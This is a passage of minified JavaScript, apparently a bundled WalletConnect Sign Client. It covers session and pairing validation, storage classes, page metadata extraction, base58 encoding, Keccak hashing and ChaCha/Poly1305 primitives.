o=="string")return[o]}catch(i){this.client.logger.warn("Error extracting tx hashes from result",i)}return[]})}async processPendingMessageEvents(){try{const e=this.client.session.keys,n=this.client.core.relayer.messages.getWithoutAck(e);for(const[r,i]of Object.entries(n))for(const o of i)try{await this.onProviderMessageEvent({topic:r,message:o,publishedAt:Date.now()})}catch{this.client.logger.warn(`Error processing pending message event for topic: ${r}, message: ${o}`)}}catch(e){this.client.logger.warn("processPendingMessageEvents failed",e)}}isInitialized(){if(!this.initialized){const{message:e}=Ee("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(Wt.message,e=>{this.onProviderMessageEvent(e)})}async onRelayMessage(e){const{topic:n,message:r,attestation:i,transportType:o}=e,{publicKey:l}=this.client.auth.authKeys.keys.includes(Wh)?this.client.auth.authKeys.get(Wh):{publicKey:void 0};try{const c=await this.client.core.crypto.decode(n,r,{receiverPublicKey:l,encoding:o===dt.link_mode?ps:kr});cw(c)?(this.client.core.history.set(n,c),await this.onRelayEventRequest({topic:n,payload:c,attestation:i,transportType:o,encryptedId:Xr(r)})):Uf(c)?(await this.client.core.history.resolve(c),await this.onRelayEventResponse({topic:n,payload:c,transportType:o}),this.client.core.history.delete(n,c.id)):await this.onRelayEventUnknownPayload({topic:n,payload:c,transportType:o}),await this.client.core.relayer.messages.ack(n,r)}catch(c){this.client.logger.error(c)}}registerExpirerEvents(){this.client.core.expirer.on(fr.expired,async e=>{const{topic:n,id:r}=R_(e.target);if(r&&this.client.pendingRequest.keys.includes(r))return await this.deletePendingSessionRequest(r,Ee("EXPIRED"),!0);if(r&&this.client.auth.requests.keys.includes(r))return await this.deletePendingAuthRequest(r,Ee("EXPIRED"),!0);n?this.client.session.keys.includes(n)&&(await this.deleteSession({topic:n,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:n})):r&&(await this.deleteProposal(r,!0),this.client.events.emit("proposal_expire",{id:r}))})}registerPairingEvents(){this.client.core.pairing.events.on(Ks.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(Ks.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!At(e,!1)){const{message:n}=Ee("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(n)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:n}=Ee("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(n)}if(fs(this.client.core.pairing.pairings.get(e).expiry)){const{message:n}=Ee("EXPIRED",`pairing topic: ${e}`);throw new Error(n)}}async isValidSessionTopic(e){if(!At(e,!1)){const{message:n}=Ee("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(n)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:n}=Ee("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(n)}if(fs(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:n}=Ee("EXPIRED",`session topic: ${e}`);throw new Error(n)}if(!this.client.core.crypto.keychain.has(e)){const{message:n}=Ee("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(n)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(At(e,!1)){const{message:n}=Ee("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(n)}else{const{message:n}=Ee("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(n)}}async isValidProposalId(e){if(!qj(e)){const{message:n}=Ee("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(n)}if(!this.client.proposal.keys.includes(e)){const{message:n}=Ee("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(n)}if(fs(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:n}=Ee("EXPIRED",`proposal id: ${e}`);throw new Error(n)}}}let XF=class extends go{constructor(e,n){super(e,n,LF,uw),this.core=e,this.logger=n}},e7=class extends go{constructor(e,n){super(e,n,jF,uw),this.core=e,this.logger=n}},t7=class extends go{constructor(e,n){super(e,n,MF,uw,r=>r.id),this.core=e,this.logger=n}},n7=class extends go{constructor(e,n){super(e,n,HF,Ff,()=>Wh),this.core=e,this.logger=n}},r7=class extends go{constructor(e,n){super(e,n,VF,Ff),this.core=e,this.logger=n}},i7=class extends go{constructor(e,n){super(e,n,WF,Ff,r=>r.id),this.core=e,this.logger=n}};var s7=Object.defineProperty,o7=(t,e,n)=>e in t?s7(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Wg=(t,e,n)=>o7(t,typeof e!="symbol"?e+"":e,n);let a7=class{constructor(e,n){this.core=e,this.logger=n,Wg(this,"authKeys"),Wg(this,"pairingTopics"),Wg(this,"requests"),this.authKeys=new n7(this.core,this.logger),this.pairingTopics=new r7(this.core,this.logger),this.requests=new i7(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}};var l7=Object.defineProperty,c7=(t,e,n)=>e in t?l7(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Fe=(t,e,n)=>c7(t,typeof e!="symbol"?e+"":e,n);let u7=class UI extends C4{constructor(e){super(e),Fe(this,"protocol",BI),Fe(this,"version",LI),Fe(this,"name",Hg.name),Fe(this,"metadata"),Fe(this,"core"),Fe(this,"logger"),Fe(this,"events",new rr.EventEmitter),Fe(this,"engine"),Fe(this,"session"),Fe(this,"proposal"),Fe(this,"pendingRequest"),Fe(this,"auth"),Fe(this,"signConfig"),Fe(this,"on",(r,i)=>this.events.on(r,i)),Fe(this,"once",(r,i)=>this.events.once(r,i)),Fe(this,"off",(r,i)=>this.events.off(r,i)),Fe(this,"removeListener",(r,i)=>this.events.removeListener(r,i)),Fe(this,"removeAllListeners",r=>this.events.removeAllListeners(r)),Fe(this,"connect",async r=>{try{return await this.engine.connect(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"pair",async r=>{try{return await this.engine.pair(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"approve",async r=>{try{return await this.engine.approve(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"reject",async r=>{try{return await this.engine.reject(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"update",async r=>{try{return await this.engine.update(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"extend",async r=>{try{return await this.engine.extend(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"request",async r=>{try{return await this.engine.request(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"respond",async r=>{try{return await this.engine.respond(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"ping",async r=>{try{return await this.engine.ping(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"emit",async r=>{try{return await this.engine.emit(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"disconnect",async r=>{try{return await this.engine.disconnect(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"find",r=>{try{return this.engine.find(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"getPendingSessionRequests",()=>{try{return this.engine.getPendingSessionRequests()}catch(r){throw this.logger.error(r.message),r}}),Fe(this,"authenticate",async(r,i)=>{try{return await this.engine.authenticate(r,i)}catch(o){throw this.logger.error(o.message),o}}),Fe(this,"formatAuthMessage",r=>{try{return this.engine.formatAuthMessage(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"approveSessionAuthenticate",async r=>{try{return await this.engine.approveSessionAuthenticate(r)}catch(i){throw this.logger.error(i.message),i}}),Fe(this,"rejectSessionAuthenticate",async r=>{try{return await this.engine.rejectSessionAuthenticate(r)}catch(i){throw this.logger.error(i.message),i}}),this.name=(e==null?void 0:e.name)||Hg.name,this.metadata=jB(e==null?void 0:e.metadata),this.signConfig=e==null?void 0:e.signConfig;const n=typeof(e==null?void 0:e.logger)<"u"&&typeof(e==null?void 0:e.logger)!="string"?e.logger:Uc(Af({level:(e==null?void 0:e.logger)||Hg.logger}));this.core=(e==null?void 0:e.core)||new BF(e),this.logger=Sn(n,this.name),this.session=new e7(this.core,this.logger),this.proposal=new XF(this.core,this.logger),this.pendingRequest=new t7(this.core,this.logger),this.engine=new QF(this),this.auth=new a7(this.core,this.logger)}static async init(e){const n=new UI(e);return await n.initialize(),n}get context(){return Fn(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success"),setTimeout(()=>{this.engine.processRelayMessageCache()},be.toMiliseconds(be.ONE_SECOND))}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}};var st={},O2;function MI(){if(O2)return st;O2=1,Object.defineProperty(st,"__esModule",{value:!0}),st.getLocalStorage=st.getLocalStorageOrThrow=st.getCrypto=st.getCryptoOrThrow=st.getLocation=st.getLocationOrThrow=st.getNavigator=st.getNavigatorOrThrow=st.getDocument=st.getDocumentOrThrow=st.getFromWindowOrThrow=st.getFromWindow=void 0;function t(g){let E;return typeof window<"u"&&typeof window[g]<"u"&&(E=window[g]),E}st.getFromWindow=t;function e(g){const E=t(g);if(!E)throw new Error(`${g} is not defined in Window`);return E}st.getFromWindowOrThrow=e;function n(){return e("document")}st.getDocumentOrThrow=n;function r(){return t("document")}st.getDocument=r;function i(){return e("navigator")}st.getNavigatorOrThrow=i;function o(){return t("navigator")}st.getNavigator=o;function l(){return e("location")}st.getLocationOrThrow=l;function c(){return t("location")}st.getLocation=c;function u(){return e("crypto")}st.getCryptoOrThrow=u;function f(){return t("crypto")}st.getCrypto=f;function d(){return e("localStorage")}st.getLocalStorageOrThrow=d;function y(){return t("localStorage")}return st.getLocalStorage=y,st}MI();var ic={},$2;function h7(){if($2)return ic;$2=1,Object.defineProperty(ic,"__esModule",{value:!0}),ic.getWindowMetadata=void 0;const t=MI();function e(){let n,r;try{n=t.getDocumentOrThrow(),r=t.getLocationOrThrow()}catch{return null}function i(){const E=n.getElementsByTagName("link"),w=[];for(let b=0;b<E.length;b++){const m=E[b],x=m.getAttribute("rel");if(x&&x.toLowerCase().indexOf("icon")>-1){const S=m.getAttribute("href");if(S)if(S.toLowerCase().indexOf("https:")===-1&&S.toLowerCase().indexOf("http:")===-1&&S.indexOf("//")!==0){let O=r.protocol+"//"+r.host;if(S.indexOf("/")===0)O+=S;else{const $=r.pathname.split("/");$.pop();const R=$.join("/");O+=R+"/"+S}w.push(O)}else if(S.indexOf("//")===0){const O=r.protocol+S;w.push(O)}else w.push(S)}}return w}function o(...E){const w=n.getElementsByTagName("meta");for(let b=0;b<w.length;b++){const m=w[b],x=["itemprop","property","name"].map(S=>m.getAttribute(S)).filter(S=>S?E.includes(S):!1);if(x.length&&x){const S=m.getAttribute("content");if(S)return S}}return""}function l(){let E=o("name","og:site_name","og:title","twitter:title");return E||(E=n.title),E}function c(){return o("description","og:description","twitter:description","keywords")}const u=l(),f=c(),d=r.origin,y=i();return{description:f,url:d,icons:y,name:u}}return ic.getWindowMetadata=e,ic}h7();function f7(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let f=0;f<e.length;f++)e[f]=255;for(let f=0;f<t.length;f++){const d=t.charAt(f),y=d.charCodeAt(0);if(e[y]!==255)throw new TypeError(d+" is ambiguous");e[y]=f}const n=t.length,r=t.charAt(0),i=Math.log(n)/Math.log(256),o=Math.log(256)/Math.log(n);function l(f){if(f instanceof Uint8Array||(ArrayBuffer.isView(f)?f=new Uint8Array(f.buffer,f.byteOffset,f.byteLength):Array.isArray(f)&&(f=Uint8Array.from(f))),!(f instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(f.length===0)return"";let d=0,y=0,g=0;const E=f.length;for(;g!==E&&f[g]===0;)g++,d++;const w=(E-g)*o+1>>>0,b=new Uint8Array(w);for(;g!==E;){let S=f[g],O=0;for(let $=w-1;(S!==0||O<y)&&$!==-1;$--,O++)S+=256*b[$]>>>0,b[$]=S%n>>>0,S=S/n>>>0;if(S!==0)throw new Error("Non-zero carry");y=O,g++}let m=w-y;for(;m!==w&&b[m]===0;)m++;let x=r.repeat(d);for(;m<w;++m)x+=t.charAt(b[m]);return x}function c(f){if(typeof f!="string")throw new TypeError("Expected String");if(f.length===0)return new Uint8Array;let d=0,y=0,g=0;for(;f[d]===r;)y++,d++;const E=(f.length-d)*i+1>>>0,w=new Uint8Array(E);for(;d<f.length;){const S=f.charCodeAt(d);if(S>255)return;let O=e[S];if(O===255)return;let $=0;for(let R=E-1;(O!==0||$<g)&&R!==-1;R--,$++)O+=n*w[R]>>>0,w[R]=O%256>>>0,O=O/256>>>0;if(O!==0)throw new Error("Non-zero carry");g=$,d++}let b=E-g;for(;b!==E&&w[b]===0;)b++;const m=new Uint8Array(y+(E-b));let x=y;for(;b!==E;)m[x++]=w[b++];return m}function u(f){const d=c(f);if(d)return d;throw new Error("Non-base"+n+" character")}return{encode:l,decodeUnsafe:c,decode:u}}var d7="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";f7(d7);const p7=":";function FI(t){const[e,n]=t.split(p7);return{namespace:e,reference:n}}function Kg(t=[],e=[]){return[...new Set([...t,...e])]}function hf(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function g7(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Yc(t,...e){if(!g7(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function y7(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");hf(t.outputLen),hf(t.blockLen)}function ja(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function zI(t,e){Yc(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}const Ph=BigInt(2**32-1),P2=BigInt(32);function m7(t,e=!1){return e?{h:Number(t&Ph),l:Number(t>>P2&Ph)}:{h:Number(t>>P2&Ph)|0,l:Number(t&Ph)|0}}function w7(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:o,l}=m7(t[i],e);[n[i],r[i]]=[o,l]}return[n,r]}const v7=(t,e,n)=>t<<n|e>>>32-n,b7=(t,e,n)=>e<<n|t>>>32-n,E7=(t,e,n)=>e<<n-32|t>>>64-n,x7=(t,e,n)=>t<<n-32|e>>>64-n,Qo=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function S7(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function Gg(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function Gr(t,e){return t<<32-e|t>>>e}const T2=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function _7(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}function A2(t){for(let e=0;e<t.length;e++)t[e]=_7(t[e])}function I7(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function zf(t){return typeof t=="string"&&(t=I7(t)),Yc(t),t}function O7(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Yc(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const o=t[r];n.set(o,i),i+=o.length}return n}let hw=class{clone(){return this._cloneInto()}};function qI(t){const e=r=>t().update(zf(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function HI(t=32){if(Qo&&typeof Qo.getRandomValues=="function")return Qo.getRandomValues(new Uint8Array(t));if(Qo&&typeof Qo.randomBytes=="function")return Qo.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const VI=[],WI=[],KI=[],$7=BigInt(0),sc=BigInt(1),P7=BigInt(2),T7=BigInt(7),A7=BigInt(256),C7=BigInt(113);for(let t=0,e=sc,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],VI.push(2*(5*r+n)),WI.push((t+1)*(t+2)/2%64);let i=$7;for(let o=0;o<7;o++)e=(e<<sc^(e>>T7)*C7)%A7,e&P7&&(i^=sc<<(sc<<BigInt(o))-sc);KI.push(i)}const[R7,D7]=w7(KI,!0),C2=(t,e,n)=>n>32?E7(t,e,n):v7(t,e,n),R2=(t,e,n)=>n>32?x7(t,e,n):b7(t,e,n);function N7(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let l=0;l<10;l++)n[l]=t[l]^t[l+10]^t[l+20]^t[l+30]^t[l+40];for(let l=0;l<10;l+=2){const c=(l+8)%10,u=(l+2)%10,f=n[u],d=n[u+1],y=C2(f,d,1)^n[c],g=R2(f,d,1)^n[c+1];for(let E=0;E<50;E+=10)t[l+E]^=y,t[l+E+1]^=g}let i=t[2],o=t[3];for(let l=0;l<24;l++){const c=WI[l],u=C2(i,o,c),f=R2(i,o,c),d=VI[l];i=t[d],o=t[d+1],t[d]=u,t[d+1]=f}for(let l=0;l<50;l+=10){for(let c=0;c<10;c++)n[c]=t[l+c];for(let c=0;c<10;c++)t[l+c]^=~n[(c+2)%10]&n[(c+4)%10]}t[0]^=R7[r],t[1]^=D7[r]}n.fill(0)}class fw extends hw{constructor(e,n,r,i=!1,o=24){if(super(),this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=o,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,hf(r),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=S7(this.state)}keccak(){T2||A2(this.state32),N7(this.state32,this.rounds),T2||A2(this.state32),this.posOut=0,this.pos=0}update(e){ja(this);const{blockLen:n,state:r}=this;e=zf(e);const i=e.length;for(let o=0;o<i;){const l=Math.min(n-this.pos,i-o);for(let c=0;c<l;c++)r[this.pos++]^=e[o++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){ja(this,!1),Yc(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,o=e.length;i<o;){this.posOut>=r&&this.keccak();const l=Math.min(r-this.posOut,o-i);e.set(n.subarray(this.posOut,this.posOut+l),i),this.posOut+=l,i+=l}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return hf(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(zI(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:o,enableXOF:l}=this;return e||(e=new fw(n,r,i,l,o)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=o,e.suffix=r,e.outputLen=i,e.enableXOF=l,e.destroyed=this.destroyed,e}}const k7=(t,e,n)=>qI(()=>new fw(e,t,n));k7(1,136,256/8);function Yg(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function GI(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function er(t,...e){if(!GI(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function D2(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function B7(t,e){er(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function N2(t){if(typeof t!="boolean")throw new Error(`boolean expected, not ${t}`)}const vs=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),L7=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),j7=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!j7)throw new Error("Non little-endian hardware is not supported");function U7(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function lm(t){if(typeof t=="string")t=U7(t);else if(GI(t))t=cm(t);else throw new Error("Uint8Array expected, got "+typeof t);return t}function M7(t,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(t,e)}function F7(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}const z7=(t,e)=>{function n(r,...i){if(er(r),t.nonceLength!==void 0){const f=i[0];if(!f)throw new Error("nonce / iv required");t.varSizeNonce?er(f):er(f,t.nonceLength)}const o=t.tagLength;o&&i[1]!==void 0&&er(i[1]);const l=e(r,...i),c=(f,d)=>{if(d!==void 0){if(f!==2)throw new Error("cipher output not supported");er(d)}};let u=!1;return{encrypt(f,d){if(u)throw new Error("cannot encrypt() twice with same key + nonce");return u=!0,er(f),c(l.encrypt.length,d),l.encrypt(f,d)},decrypt(f,d){if(er(f),o&&f.length<o)throw new Error("invalid ciphertext length: smaller than tagLength="+o);return c(l.decrypt.length,d),l.decrypt(f,d)}}}return Object.assign(n,t),n};function k2(t,e,n=!0){if(e===void 0)return new Uint8Array(t);if(e.length!==t)throw new Error("invalid output length, expected "+t+", got: "+e.length);if(n&&!q7(e))throw new Error("invalid output, must be aligned");return e}function B2(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),o=BigInt(4294967295),l=Number(n>>i&o),c=Number(n&o);t.setUint32(e+4,l,r),t.setUint32(e+0,c,r)}function q7(t){return t.byteOffset%4===0}function cm(t){return Uint8Array.from(t)}function Ua(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}const YI=t=>Uint8Array.from(t.split("").map(e=>e.charCodeAt(0))),H7=YI("expand 16-byte k"),V7=YI("expand 32-byte k"),W7=vs(H7),K7=vs(V7);function Ke(t,e){return t<<e|t>>>32-e}function um(t){return t.byteOffset%4===0}const Th=64,G7=16,JI=2**32-1,L2=new Uint32Array;function Y7(t,e,n,r,i,o,l,c){const u=i.length,f=new Uint8Array(Th),d=vs(f),y=um(i)&&um(o),g=y?vs(i):L2,E=y?vs(o):L2;for(let w=0;w<u;l++){if(t(e,n,r,d,l,c),l>=JI)throw new Error("arx: counter overflow");const b=Math.min(Th,u-w);if(y&&b===Th){const m=w/4;if(w%4!==0)throw new Error("arx: invalid block position");for(let x=0,S;x<G7;x++)S=m+x,E[S]=g[S]^d[x];w+=Th;continue}for(let m=0,x;m<b;m++)x=w+m,o[x]=i[x]^f[m];w+=b}}function J7(t,e){const{allowShortKeys:n,extendNonceFn:r,counterLength:i,counterRight:o,rounds:l}=M7({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof t!="function")throw new Error("core must be a function");return Yg(i),Yg(l),N2(o),N2(n),(c,u,f,d,y=0)=>{er(c),er(u),er(f);const g=f.length;if(d===void 0&&(d=new Uint8Array(g)),er(d),Yg(y),y<0||y>=JI)throw new Error("arx: counter overflow");if(d.length<g)throw new Error(`arx: output (${d.length}) is shorter than data (${g})`);const E=[];let w=c.length,b,m;if(w===32)E.push(b=cm(c)),m=K7;else if(w===16&&n)b=new Uint8Array(32),b.set(c),b.set(c,16),m=W7,E.push(b);else throw new Error(`arx: invalid 32-byte key, got length=${w}`);um(u)||E.push(u=cm(u));const x=vs(b);if(r){if(u.length!==24)throw new Error("arx: extended nonce must be 24 bytes");r(m,x,vs(u.subarray(0,16)),x),u=u.subarray(16)}const S=16-i;if(S!==u.length)throw new Error(`arx: nonce must be ${S} or 16 bytes`);if(S!==12){const $=new Uint8Array(12);$.set(u,o?0:12-u.length),u=$,E.push(u)}const O=vs(u);return Y7(t,m,x,O,f,d,y,l),Ua(...E),d}}const on=(t,e)=>t[e++]&255|(t[e++]&255)<<8;class Z7{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=lm(e),er(e,32);const n=on(e,0),r=on(e,2),i=on(e,4),o=on(e,6),l=on(e,8),c=on(e,10),u=on(e,12),f=on(e,14);this.r[0]=n&8191,this.r[1]=(n>>>13|r<<3)&8191,this.r[2]=(r>>>10|i<<6)&7939,this.r[3]=(i>>>7|o<<9)&8191,this.r[4]=(o>>>4|l<<12)&255,this.r[5]=l>>>1&8190,this.r[6]=(l>>>14|c<<2)&8191,this.r[7]=(c>>>11|u<<5)&8065,this.r[8]=(u>>>8|f<<8)&8191,this.r[9]=f>>>5&127;for(let d=0;d<8;d++)this.pad[d]=on(e,16+2*d)}process(e,n,r=!1){const i=r?0:2048,{h:o,r:l}=this,c=l[0],u=l[1],f=l[2],d=l[3],y=l[4],g=l[5],E=l[6],w=l[7],b=l[8],m=l[9],x=on(e,n+0),S=on(e,n+2),O=on(e,n+4),$=on(e,n+6),R=on(e,n+8),T=on(e,n+10),D=on(e,n+12),B=on(e,n+14);let k=o[0]+(x&8191),G=o[1]+((x>>>13|S<<3)&8191),W=o[2]+((S>>>10|O<<6)&8191),J=o[3]+((O>>>7|$<<9)&8191),ne=o[4]+(($>>>4|R<<12)&8191),j=o[5]+(R>>>1&8191),A=o[6]+((R>>>14|T<<2)&8191),C=o[7]+((T>>>11|D<<5)&8191),U=o[8]+((D>>>8|B<<8)&8191),M=o[9]+(B>>>5|i),N=0,V=N+k*c+G*(5*m)+W*(5*b)+J*(5*w)+ne*(5*E);N=V>>>13,V&=8191,V+=j*(5*g)+A*(5*y)+C*(5*d)+U*(5*f)+M*(5*u),N+=V>>>13,V&=8191;let F=N+k*u+G*c+W*(5*m)+J*(5*b)+ne*(5*w);N=F>>>13,F&=8191,F+=j*(5*E)+A*(5*g)+C*(5*y)+U*(5*d)+M*(5*f),N+=F>>>13,F&=8191;let q=N+k*f+G*u+W*c+J*(5*m)+ne*(5*b);N=q>>>13,q&=8191,q+=j*(5*w)+A*(5*E)+C*(5*g)+U*(5*y)+M*(5*d),N+=q>>>13,q&=8191;let Q=N+k*d+G*f+W*u+J*c+ne*(5*m);N=Q>>>13,Q&=8191,Q+=j*(5*b)+A*(5*w)+C*(5*E)+U*(5*g)+M*(5*y),N+=Q>>>13,Q&=8191;let te=N+k*y+G*d+W*f+J*u+ne*c;N=te>>>13,te&=8191,te+=j*(5*m)+A*(5*b)+C*(5*w)+U*(5*E)+M*(5*g),N+=te>>>13,te&=8191;let se=N+k*g+G*y+W*d+J*f+ne*u;N=se>>>13,se&=8191,se+=j*c+A*(5*m)+C*(5*b)+U*(5*w)+M*(5*E),N+=se>>>13,se&=8191;let le=N+k*E+G*g+W*y+J*d+ne*f;N=le>>>13,le&=8191,le+=j*u+A*c+C*(5*m)+U*(5*b)+M*(5*w),N+=le>>>13,le&=8191;let pe=N+k*w+G*E+W*g+J*y+ne*d;N=pe>>>13,pe&=8191,pe+=j*f+A*u+C*c+U*(5*m)+M*(5*b),N+=pe>>>13,pe&=8191;let he=N+k*b+G*w+W*E+J*g+ne*y;N=he>>>13,he&=8191,he+=j*d+A*f+C*u+U*c+M*(5*m),N+=he>>>13,he&=8191;let fe=N+k*m+G*b+W*w+J*E+ne*g;N=fe>>>13,fe&=8191,fe+=j*y+A*d+C*f+U*u+M*c,N+=fe>>>13,fe&=8191,N=(N<<2)+N|0,N=N+V|0,V=N&8191,N=N>>>13,F+=N,o[0]=V,o[1]=F,o[2]=q,o[3]=Q,o[4]=te,o[5]=se,o[6]=le,o[7]=pe,o[8]=he,o[9]=fe}finalize(){const{h:e,pad:n}=this,r=new Uint16Array(10);let i=e[1]>>>13;e[1]&=8191;for(let c=2;c<10;c++)e[c]+=i,i=e[c]>>>13,e[c]&=8191;e[0]+=i*5,i=e[0]>>>13,e[0]&=8191,e[1]+=i,i=e[1]>>>13,e[1]&=8191,e[2]+=i,r[0]=e[0]+5,i=r[0]>>>13,r[0]&=8191;for(let c=1;c<10;c++)r[c]=e[c]+i,i=r[c]>>>13,r[c]&=8191;r[9]-=8192;let o=(i^1)-1;for(let c=0;c<10;c++)r[c]&=o;o=~o;for(let c=0;c<10;c++)e[c]=e[c]&o|r[c];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let l=e[0]+n[0];e[0]=l&65535;for(let c=1;c<8;c++)l=(e[c]+n[c]|0)+(l>>>16)|0,e[c]=l&65535;Ua(r)}update(e){D2(this);const{buffer:n,blockLen:r}=this;e=lm(e);const i=e.length;for(let o=0;o<i;){const 